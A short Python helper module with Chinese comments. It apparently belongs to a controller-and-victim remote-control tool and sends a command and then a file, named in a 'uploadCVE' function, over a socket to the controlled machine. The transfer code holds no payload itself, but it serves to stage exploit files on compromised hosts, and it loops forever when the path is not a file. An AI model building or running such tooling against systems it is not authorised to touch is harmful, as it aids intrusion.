import os
import struct

"""
上传辅助模块
"""


def uploadCVE(conn, command):
    # 把主控端的命令发送给被控端
    conn.sendall(command.encode())
    # 从命令中分离出要上传文件的路径
    commandList = command.split()
    while True:
        uploadFilePath = commandList[1]
        if os.path.isfile(uploadFilePath):
            fileInfo = struct.pack('128sq', bytes(os.path.basename(uploadFilePath).encode('utf-8')),
                                   os.stat(uploadFilePath).st_size)
            conn.sendall(fileInfo)
            print('\033[1;32;32m' + '[+] Successfully sent file information => (name:{0} size:{1}).'.format(os.path.basename(uploadFilePath), os.stat(uploadFilePath).st_size) + '\033[0m')
            with open(uploadFilePath, 'rb') as f:
                while True:
                    data = f.read(1024)
                    if not data:
                        print('\033[1;32;32m' + "[+] File uploaded successfully!" + '\033[0m')
                        break
                    conn.sendall(data)
                break
